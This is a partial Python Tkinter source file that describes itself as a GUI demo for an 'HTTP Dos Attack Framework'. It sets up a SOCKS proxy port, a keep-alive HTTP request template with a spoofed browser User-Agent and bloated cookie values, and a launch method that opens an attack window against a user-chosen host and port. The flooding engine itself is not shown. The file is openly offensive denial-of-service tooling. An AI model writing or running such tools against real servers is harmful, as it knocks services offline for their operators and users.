...
"""
This is just a HTTP Dos attack GUI interface demo here.
"""
...
class MainWindow(Tk):
    def __init__(self):
        Tk.__init__(self)
        self.title(string = "HTTP Dos Attack Framework")
        self.lws = []
        ...
        self.options['socksport'].set(8050)
        ...
        self.options['request'].insert(END, 'GET / HTTP/1.1\r\nHost: www.test01.com\r\nKeep-Alive: 300\r\nConnection: Keep-Alive\r\nReferer: http://www.test02.com/\r\n')
        self.options['request'].insert(END, 'User-Agent: Mozilla/6.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/65.0.3409.2 Safari/532.5\r\n')
        self.options['request'].insert(END, 'Cookie: data1=' + ('A' * 100) + '&data2=' + ('A' * 100) + '&data3=' + ('A' * 100) + '\r\n')


    def launch(self):
        attackoptions = DefaultOptions()
        for key in self.options.keys():
            if key == 'request': attackoptions[key] = self.options[key].get('1.0', END)
            elif key == 'quitimmediately' or key == 'ssl':
                if self.options[key].get() == 0:
                    attackoptions[key] = False
                else: attackoptions[key] = self.options[key].get()
            else: attackoptions[key] = self.options[key].get()

        self.lws.append(AttackWindow('%s:%i' % (attackoptions['host'], attackoptions['port']), attackoptions))
